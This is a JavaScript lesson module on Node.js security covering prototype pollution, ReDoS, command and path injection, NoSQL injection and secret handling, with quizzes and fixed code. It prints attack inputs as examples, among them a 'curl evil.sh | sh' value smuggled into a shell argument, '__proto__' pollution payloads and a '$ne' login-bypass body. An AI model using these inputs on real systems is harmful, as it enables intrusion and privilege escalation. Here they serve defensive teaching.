IA.register({
  track: 'nodejs',
  slug: 'security',
  title: 'Node security',
  tagline: 'Node’s classic vulnerabilities come from its strengths: <b>dynamic objects</b> (prototype pollution), <b>one thread</b> (one bad regex stalls every user), <b>strings everywhere</b> (SQL, shell and path injection) and <b><code>process.env</code></b> (secrets that leak into logs and child processes). The permission model helps, but it’s a seatbelt, not a sandbox.',
  tldr: {
    problem: 'A JSON body with a <code>"__proto__"</code> key can make every object in the process look like an admin. A 30-character string can freeze a server for minutes. A file name can read <code>/etc/passwd</code>. None of these needs a bug in Node itself, only one careless line.',
    model: '<b>Treat every input as data, never as structure or code</b>: parameterise SQL, pass argv arrays instead of shell strings, resolve paths and check the prefix, validate JSON against a schema that rejects unknown keys. <b>Bound everything that runs on the event loop</b>: input sizes, regex complexity, JSON size. <b>Keep secrets out of code, logs and the environment of child processes.</b>',
    hook: '“How does a deep-merge utility lead to privilege escalation?” <code>merge({}, JSON.parse(body))</code> walks into <code>target[\'__proto__\']</code>, which is <code>Object.prototype</code>, and writes <code>isAdmin: true</code> there. From then on <code>({}).isAdmin === true</code> for every object in the process.',
    facts: [
      { v: '1 thread', l: 'runs all your JavaScript, so a catastrophically backtracking regex blocks every request, not just the attacker’s' },
      { v: 'Node 22.13', l: 'renamed <code>--experimental-permission</code> to <code>--permission</code> and marked the permission model stable (also in 23.5). It restricts the file system, child processes, workers and addons, not the network' },
      { v: 'Node 20.6', l: 'added <code>--env-file=.env</code>, so <code>dotenv</code> is optional; <code>process.loadEnvFile()</code> followed in 20.12/21.7' }
    ]
  },
  intro: {
    what: 'Security in a Node service is mostly about <b>input</b>: data from requests, files and other services. Bugs happen when input is treated as something more powerful than data: part of a SQL query, a shell command, a file path, a regular expression to run, or the <i>shape</i> of an object. Node adds two twists: every JavaScript object inherits from one shared <b>prototype</b>, and all requests share <b>one thread</b>.',
    analogy: { icon: '🏢', title: 'A shared office building', text: 'Every object is an office that inherits the building’s rules (the prototype). Prototype pollution is a visitor scribbling a new rule on the building’s notice board: now every office “has” it. ReDoS is one visitor occupying the only lift (the event-loop thread) for an hour. The permission model is a keycard system: useful against your own staff wandering into the server room by mistake, useless against a burglar who is already inside.' },
    steps: [
      { t: 'Parameterise, don’t concatenate', d: 'Let the driver send values separately from the SQL text.', code: "await pool.query('SELECT * FROM users WHERE email = $1', [email]);" },
      { t: 'No shell for user input', d: '<code>execFile</code> and <code>spawn</code> take an argument array; no shell parses it.', code: "execFile('convert', [input, '-resize', '200x', output]);" },
      { t: 'Validate the shape', d: 'A schema that rejects unknown keys blocks <code>__proto__</code> payloads and surprise fields.' },
      { t: 'Bound the work', d: 'Limit body size, string lengths and regex complexity, because all requests share one thread. See <a href="blocking-event-loop.html">Blocking the event loop</a>.' },
      { t: 'Secrets from outside', d: 'Inject secrets at runtime (a secret manager or a mounted file), redact them in logs, and never commit <code>.env</code>.' }
    ],
    terms: [
      ['injection', 'Input that ends up being interpreted as code or commands (SQL, shell, NoSQL operators).'],
      ['prototype', 'The object other objects inherit properties from; almost all objects share <code>Object.prototype</code>.'],
      ['prototype pollution', 'Writing a property onto a shared prototype, so every object appears to have it.'],
      ['ReDoS', 'Regular-expression denial of service: an input that makes a regex take exponential time.'],
      ['path traversal', 'Using <code>../</code> or absolute paths to escape the folder a server meant to serve.'],
      ['permission model', 'Node’s opt-in flags that restrict file system, child-process and worker access.']
    ]
  },
  visual: {
    title: 'Prototype pollution through a merge',
    caption: 'Pick a payload and a defence, then press Play or Step. The yellow box is where the merge is currently writing. Watch how a key path reaches <code>Object.prototype</code>, and which defences stop which path.'
  },
  extras: [
    { id: 'security-redos', title: 'Why one regex can stall the server', label: 'ReDoS', caption: 'Press Play to grow the input <code>"aaa…a!"</code> one character at a time, or drag the slider. The bars count the match attempts a backtracking engine (like V8’s Irregexp) makes before it gives up.' }
  ],
  gotchas: [
    { trap: 'Deep merge / set-by-path on untrusted JSON', code: `merge(config, JSON.parse(req.body));          // "__proto__": {...}
_.set(obj, req.query.path, req.query.value);  // path = "constructor.prototype.isAdmin"`, why: '<code>JSON.parse</code> happily creates an own key named <code>__proto__</code>. A recursive merge then reads <code>target["__proto__"]</code>, gets <code>Object.prototype</code>, and writes into it. <code>constructor.prototype</code> reaches the same place.', fix: 'Validate with a schema that rejects unknown keys. In merge/set code, skip <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>. Use <code>Map</code> or <code>Object.create(null)</code> for dictionaries. Consider <code>node --disable-proto=delete</code>. Keep lodash and similar libraries patched.' },
    { trap: 'Plain objects as dictionaries', code: `const counts = {};
for (const w of words) counts[w] = (counts[w] || 0) + 1;   // "constructor"? "__proto__"?`, why: 'Keys like <code>constructor</code>, <code>toString</code> or <code>__proto__</code> collide with inherited properties, which gives wrong results or lets user input change the prototype.', fix: 'Use <code>new Map()</code> for data keyed by user input, or <code>Object.create(null)</code>. Use <code>Object.hasOwn(obj, k)</code> instead of <code>obj[k]</code> truthiness checks.' },
    { trap: 'Shell strings with user input', code: `exec(\`ffmpeg -i \${req.query.file} out.mp4\`);   // file = "x; curl evil.sh | sh"`, why: '<code>exec</code> runs the string through <code>/bin/sh</code>, so <code>;</code>, <code>$()</code> and backticks in the input become commands. <code>spawn(…, { shell: true })</code> has the same problem.', fix: '<code>execFile</code>/<code>spawn</code> with an argument array and no shell. Validate the value anyway (allow-list), and put <code>--</code> before user arguments so they can’t become options.' },
    { trap: 'Evil regexes on user input', code: `const EMAIL = /^([a-zA-Z0-9]+\\.?)+@example\\.com$/;   // nested quantifier
EMAIL.test('a'.repeat(40) + '!');                      // backtracks exponentially`, why: 'V8’s default engine backtracks. Nested or overlapping quantifiers (<code>(a+)+</code>, <code>(a|a)*</code>, <code>(\\w+\\s?)*</code>) make a failing match try exponentially many splits, and the thread is blocked for the whole time.', fix: 'Rewrite to avoid ambiguity, cap the input length before matching, lint regexes (e.g. <code>eslint-plugin-regexp</code>), or use the <code>re2</code> package (linear time) for user-supplied patterns.' },
    { trap: 'path.join is not a security check', code: `const file = path.join(ROOT, req.params.name);   // "../../etc/passwd"
if (file.startsWith(ROOT)) send(file);           // "/srv/files-old/…" also passes`, why: '<code>join</code> normalises <code>..</code> segments, so it can move above ROOT. A plain <code>startsWith(ROOT)</code> also accepts a sibling folder such as <code>/srv/files-old</code>.', fix: '<code>const p = path.resolve(ROOT, name)</code>, then require <code>p.startsWith(ROOT + path.sep)</code>. Better: map ids to files instead of accepting names, and reject names containing <code>/</code>, <code>\\</code> or NUL.' },
    { trap: 'Secrets in logs and error objects', code: `catch (err) { log.error(err); }   // HTTP client errors often carry config: headers, auth`, why: 'Many client libraries attach the request config (including <code>Authorization</code> headers) to errors. Structured loggers serialize it all. <code>process.env</code> is also inherited by every child process you spawn.', fix: 'Configure redaction (<code>pino({ redact: [\'req.headers.authorization\', \'*.password\'] })</code>), log a mapped error instead of the raw object, and pass an explicit <code>env</code> to child processes.' },
    { trap: 'Comparing secrets with ===', code: `if (req.headers['x-signature'] === expected) ok();`, why: 'String comparison returns at the first mismatching character, so response timing leaks how much of the guess was right.', fix: '<code>crypto.timingSafeEqual(a, b)</code> on buffers of the same length (it throws if lengths differ, so compare lengths or HMAC digests first).' }
  ],
  scenarios: [
    { title: 'Every user became an admin for 40 minutes',
      symptom: 'After a deploy, support reports normal users seeing the admin menu. It stops when the pods are restarted, then comes back.',
      diagnose: `// in a REPL attached to a running pod (node --inspect) or in a test:
({}).isAdmin                       // true ← it’s on Object.prototype
Object.getOwnPropertyNames(Object.prototype).filter((k) => !builtIns.has(k))`,
      cause: 'A new “update preferences” endpoint deep-merges the JSON body into the user’s settings. Someone sent <code>{"__proto__":{"isAdmin":true}}</code>. The merge wrote into <code>Object.prototype</code>; the auth check <code>if (user.isAdmin)</code> found it through inheritance on every user object.',
      fix: 'Validate the body with a schema (<code>additionalProperties: false</code>), make the merge skip dangerous keys, read flags with <code>Object.hasOwn</code>, and run with <code>--disable-proto=delete</code> as defence in depth.',
      fixCode: `const BAD = new Set(['__proto__', 'constructor', 'prototype']);
function safeMerge(target, src) {
  for (const key of Object.keys(src)) {
    if (BAD.has(key)) continue;
    const v = src[key];
    if (v && typeof v === 'object' && !Array.isArray(v)) {
      if (!Object.hasOwn(target, key)) target[key] = {};
      safeMerge(target[key], v);
    } else target[key] = v;
  }
  return target;
}` },
    { title: 'API p99 at 30 s, CPU at 100%, one request to blame',
      symptom: 'All pods go to 100% CPU, health checks time out, Kubernetes restarts them. It recurs a few times a day.',
      diagnose: `node --cpu-prof server.js     # or a perf/0x flame graph during an incident
# the profile is one wide frame: RegExp exec inside validateUsername()`,
      cause: 'Username validation used <code>/^([a-z0-9]+[-_]?)+$/i</code>. An input of 30 letters followed by <code>!</code> makes the regex backtrack exponentially, and the event loop is blocked while it does.',
      fix: 'Cap the length first, rewrite the pattern without nested quantifiers, and add a regex linter to CI. For patterns that users supply, use <code>re2</code>.',
      fixCode: `const USERNAME = /^[a-z0-9]+(?:[-_][a-z0-9]+)*$/i;   // unambiguous
export const validUsername = (s) => typeof s === 'string' && s.length <= 32 && USERNAME.test(s);` },
    { title: 'Database credentials in the log aggregator',
      symptom: 'A routine audit finds a Postgres connection string with a password in thousands of log lines.',
      cause: 'The service logged <code>{ err, config }</code> on startup failures, and the config object held <code>DATABASE_URL</code>. The same value was also visible to a spawned image-processing child process through <code>process.env</code>.',
      fix: 'Rotate the credential, purge the logs, add logger redaction, and log only an allow-list of config keys. Spawn children with an explicit minimal <code>env</code>. Prefer short-lived credentials (IAM/workload identity) over static passwords.',
      fixCode: `const log = pino({ redact: { paths: ['config.databaseUrl', '*.password', 'req.headers.authorization'], censor: '[redacted]' } });
spawn('convert', args, { env: { PATH: process.env.PATH } });` }
  ],
  puzzles: [
    { kind: 'predict', q: 'A naive deep merge receives a request body. What prints?', code: `function merge(target, src) {
  for (const key in src) {
    if (typeof src[key] === 'object' && src[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], src[key]);
    } else {
      target[key] = src[key];
    }
  }
  return target;
}

const body = JSON.parse('{"name":"eve","__proto__":{"isAdmin":true}}');
merge({}, body);

const user = {};
console.log(user.isAdmin);`, options: ['undefined', 'true', 'TypeError', 'false'], answer: 1, explain: '<code>JSON.parse</code> creates an own key <code>"__proto__"</code>. In the merge, <code>target["__proto__"]</code> is <code>Object.prototype</code> (truthy, so no new object is created), and the recursion writes <code>isAdmin</code> onto it. Every plain object now inherits <code>isAdmin: true</code>.', run: true, expect: 'true' },
    { kind: 'predict', q: 'Object.assign vs spread with the same payload. What prints?', code: `const payload = JSON.parse('{"__proto__": {"x": 1}}');
const a = Object.assign({}, payload);
const b = { ...payload };
console.log(a.x, b.x, ({}).x);`, options: ['1 1 1', '1 undefined undefined', 'undefined undefined undefined', 'undefined 1 undefined'], answer: 1, explain: '<code>Object.assign</code> uses assignment, so <code>a.__proto__ = {x: 1}</code> runs the setter and changes <b>a’s own prototype</b> (a.x is 1, nothing global). Spread defines an own data property literally named <code>__proto__</code>, so <code>b.x</code> is undefined. Neither pollutes <code>Object.prototype</code>; a recursive merge does.', run: true, expect: '1 undefined undefined' },
    { kind: 'predict', q: 'Objects as dictionaries. What prints?', code: `const words = ['constructor', 'toString', 'a'];

const naive = {};
for (const w of words) naive[w] = (naive[w] || 0) + 1;

const safe = Object.create(null);
for (const w of words) safe[w] = (safe[w] || 0) + 1;

console.log(typeof naive.constructor, safe.constructor);`, options: ['number 1', 'string 1', 'function 1', 'number undefined'], answer: 1, explain: '<code>naive.constructor</code> starts as the inherited <code>Object</code> function, so <code>Object + 1</code> becomes the string <code>"function Object() { [native code] }1"</code>. The null-prototype object inherits nothing, so it counts correctly. A <code>Map</code> is the clearest fix.', run: true, expect: 'string 1' },
    { kind: 'predict', q: 'Path handling (POSIX). What prints?', code: `const path = require('node:path').posix;
const root = '/srv/files';
console.log(path.join(root, '../etc/passwd'));
console.log(path.join(root, '/etc/passwd'));
console.log(path.resolve(root, '/etc/passwd'));`, options: ['/srv/files/../etc/passwd, /srv/files/etc/passwd, /srv/files/etc/passwd', '/srv/etc/passwd, /srv/files/etc/passwd, /etc/passwd', '/etc/passwd, /etc/passwd, /etc/passwd', '/srv/etc/passwd, /etc/passwd, /srv/files/etc/passwd'], answer: 1, explain: '<code>join</code> concatenates then normalises, so <code>..</code> climbs out of <code>files</code>. <code>resolve</code> restarts at any absolute segment. Neither is a security check: resolve, then verify the result starts with <code>root + path.sep</code>.', run: true, expect: '/srv/etc/passwd\n/srv/files/etc/passwd\n/etc/passwd' },
    { kind: 'predict', q: 'Comparing a signature of the wrong length. What prints?', code: `const crypto = require('node:crypto');
try {
  crypto.timingSafeEqual(Buffer.from('abc'), Buffer.from('abcd'));
  console.log('compared');
} catch (e) {
  console.log(e.code);
}`, options: ['compared', 'ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH', 'ERR_INVALID_ARG_TYPE', 'false'], answer: 1, explain: '<code>timingSafeEqual</code> requires equal byte lengths and throws a RangeError otherwise. Compare fixed-length values, such as HMAC digests, so the length check doesn’t leak anything.', run: true, expect: 'ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH' },
    { kind: 'concept', q: 'Which regex is vulnerable to catastrophic backtracking on an input like <code>"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"</code>?', options: ['<code>/^a+$/</code>', '<code>/^(a+)+$/</code>', '<code>/^[a-z]{1,30}$/</code>', '<code>/^a+b?$/</code>'], answer: 1, explain: 'The nested quantifier gives the engine exponentially many ways to split the run of a’s between the inner and outer <code>+</code>, and it tries them all before failing at <code>!</code>. The others have only one way to match each character.' },
    { kind: 'concept', q: 'Node 22.13+, started with <code>node --permission --allow-fs-read=/app server.js</code>. Which still works?', options: ['Writing to /tmp', 'Spawning a child process', '<code>fetch(\'https://example.com\')</code>', 'Reading /etc/passwd'], answer: 2, explain: 'In Node 22 the permission model restricts the file system, child processes, worker threads, native addons and WASI, but <b>not network access</b>. It is designed to stop trusted code from doing unintended things; the Node docs say it doesn’t protect against malicious code.' },
    { kind: 'concept', q: 'A login endpoint passes <code>req.body</code> straight into <code>users.findOne({ email: body.email, password: body.password })</code> (MongoDB). The attacker sends <code>{"email":"a@b.c","password":{"$ne":null}}</code>. What happens?', options: ['Type error, login fails', 'The query matches any password: NoSQL operator injection', 'Mongo escapes it automatically', '400 from Express'], answer: 1, explain: 'JSON bodies can contain objects, and <code>{$ne: null}</code> is a query operator. Validate that fields are strings (schema), or cast with <code>String()</code>, and of course compare password hashes rather than querying by password.' }
  ],
  interview: [
    { q: 'Explain prototype pollution and how to prevent it.', a: '<p>Almost every object inherits from <code>Object.prototype</code>. If attacker-controlled keys can reach it, usually through <code>__proto__</code> or <code>constructor.prototype</code> in a recursive merge, clone or set-by-path, then a property written there appears on every object. Effects range from changed defaults and auth bypass to remote code execution through “gadgets” (libraries that read an option like <code>shell</code> or <code>env</code> from an inherited property). Prevention: schema-validate input and reject unknown keys; skip the three dangerous keys in merge code; use <code>Map</code>/<code>Object.create(null)</code> for dictionaries; check <code>Object.hasOwn</code>; run with <code>--disable-proto=delete</code> or <code>throw</code>; keep dependencies patched.</p>', fu: 'Why doesn’t <code>Object.freeze(Object.prototype)</code> solve it everywhere? (It works, but some libraries patch prototypes and break; and other built-in prototypes stay writable.)', lvl: 'core' },
    { q: 'What is ReDoS and why is it worse in Node than in a thread-per-request server?', a: '<p>A regex with ambiguous nested quantifiers backtracks exponentially on certain non-matching inputs. In Node, the regex runs on the single event-loop thread, so one request stalls every other request and the health checks. In Tomcat it would burn one worker thread (still bad, but contained). Fix the pattern, cap input length, use <code>re2</code> for untrusted patterns, and run regex linters in CI.</p>', lvl: 'core' },
    { q: 'How do you avoid command injection with child_process?', a: '<p>Never put user input into a string passed to <code>exec</code> or <code>spawn(…, { shell: true })</code>. Use <code>execFile</code>/<code>spawn</code> with an argument array, so no shell parses the input; validate the values against an allow-list; put <code>--</code> before positional arguments; pass a minimal <code>env</code>; set a <code>timeout</code> and <code>maxBuffer</code>.</p>', lvl: 'core' },
    { q: 'What does Node’s permission model do, and what doesn’t it do?', a: '<p>Started with <code>--permission</code> (Node 22.13+/23.5+; <code>--experimental-permission</code> in Node 20 and earlier 22 releases), the process is denied file system reads and writes, child processes, worker threads, native addons and WASI unless granted with <code>--allow-fs-read</code>, <code>--allow-fs-write</code>, <code>--allow-child-process</code>, <code>--allow-worker</code> and so on. Code can check <code>process.permission.has(\'fs.write\', path)</code>; denials throw <code>ERR_ACCESS_DENIED</code>. In Node 22 it does not restrict network access, and the docs are explicit that it’s not a sandbox against malicious code. For real isolation use containers, seccomp, read-only file systems and network policies.</p>', lvl: 'deep' },
    { q: 'Where should secrets live in a Node service?', a: '<p>Injected at runtime from a secret manager (Vault, AWS Secrets Manager, Azure Key Vault) or as files mounted by the platform, ideally short-lived credentials from workload identity. <code>.env</code> files are for local development only (<code>node --env-file=.env</code> since 20.6) and must be in <code>.gitignore</code>. Don’t bake secrets into images, redact them in logs, and remember that <code>process.env</code> is inherited by child processes and readable via <code>/proc/&lt;pid&gt;/environ</code> by the same user.</p>', lvl: 'core' },
    { q: 'How do you prevent SQL injection with node-postgres or an ORM?', a: '<p>Use parameterised queries (<code>$1</code> placeholders with a values array), which send values separately from the SQL text. Watch the places that can’t be parameters: identifiers and sort directions must come from an allow-list (or <code>pg-format</code>’s <code>%I</code>). With ORMs, beware of “raw” escape hatches like <code>sequelize.query</code> and Prisma’s <code>$queryRawUnsafe</code>; tagged-template versions (<code>$queryRaw`…`</code>) parameterise for you.</p>', lvl: 'core' },
    { q: 'What HTTP-level hardening do you add to an Express or Fastify app?', a: '<ul><li>Security headers (<code>helmet</code> / <code>@fastify/helmet</code>), strict CORS allow-list.</li><li>Body size limits; reject unexpected content types.</li><li>Rate limiting per user/IP at the edge or with <code>@fastify/rate-limit</code>.</li><li>Correct <code>trust proxy</code> so IPs aren’t spoofable.</li><li>No stack traces in responses; generic 500 bodies.</li><li>Cookies: <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>.</li></ul>', lvl: 'core' },
    { q: 'How do you handle supply-chain risk for npm dependencies?', a: '<p>Commit the lockfile and install with <code>npm ci</code>; review new dependencies; run <code>npm audit</code>/Dependabot/Socket in CI; disable install scripts where possible (<code>--ignore-scripts</code>); pin GitHub Actions; publish with provenance. See <a href="npm-dependencies.html">npm &amp; dependencies</a>.</p>', lvl: 'core' },
    { q: 'What was CVE-2024-45296 and why does it matter to Express users?', a: '<p>A ReDoS in <code>path-to-regexp</code>, the library Express uses to compile route paths: some route patterns with two parameters in one segment produced backtracking regexes. Express 4 picked up a patched version (0.1.10; that fix turned out incomplete, and 0.1.12 closed the follow-up CVE-2024-52798), and Express 5’s path-to-regexp 8 removed the risky syntax. Lesson: ReDoS can sit in your dependencies, not just in your own regexes.</p>', lvl: 'deep' },
    { q: 'Java comparison: does the JVM have prototype pollution?', a: '<p>Not as such: Java classes are fixed at compile time. The closest relatives are deserialization gadget chains (Jackson polymorphic typing, Java serialization), where input chooses which classes get instantiated, and mass assignment (binding request fields straight onto entities). The defence is the same idea: bind input to explicit DTOs and reject unknown properties (<code>FAIL_ON_UNKNOWN_PROPERTIES</code>).</p>', lvl: 'deep' }
  ],
  code: [
    { title: 'Input validation that blocks pollution', lang: 'ts', code: `import { z } from 'zod';

const Prefs = z.object({
  theme: z.enum(['light', 'dark']),
  pageSize: z.number().int().min(10).max(100),
}).strict();                          // unknown keys (incl. "__proto__") → error

app.patch('/me/prefs', async (req, res) => {
  const parsed = Prefs.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ code: 'INVALID' });
  await prefs.update(req.user.id, parsed.data);   // a fresh, plain object
  res.status(204).end();
});`, note: 'Defence in depth: start the process with <code>node --disable-proto=delete</code> so <code>obj.__proto__</code> doesn’t exist at all (use <code>Object.getPrototypeOf</code>).' },
    { title: 'Safe child processes and paths', lang: 'ts', code: `import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import path from 'node:path';

const run = promisify(execFile);
const ROOT = path.resolve('/srv/uploads');

export function resolveUpload(name: string) {
  const p = path.resolve(ROOT, name);
  if (!p.startsWith(ROOT + path.sep)) throw Object.assign(new Error('bad path'), { status: 400 });
  return p;
}

export async function thumbnail(name: string) {
  const src = resolveUpload(name);
  await run('convert', ['--', src, '-resize', '200x200', src + '.thumb.png'], {
    timeout: 10_000, maxBuffer: 1024 * 1024, env: { PATH: process.env.PATH },
  });
}` },
    { title: 'Running with the permission model', lang: 'bash', code: `# Node 22.13+ (earlier 22.x: --experimental-permission)
node --permission \\
  --allow-fs-read=/app \\
  --allow-fs-write=/app/tmp \\
  server.js

# inside the app
node --permission -e "console.log(process.permission.has('fs.write', '/etc'))"   # false

# local secrets without dotenv (Node 20.6+)
node --env-file=.env server.js` }
  ]
});
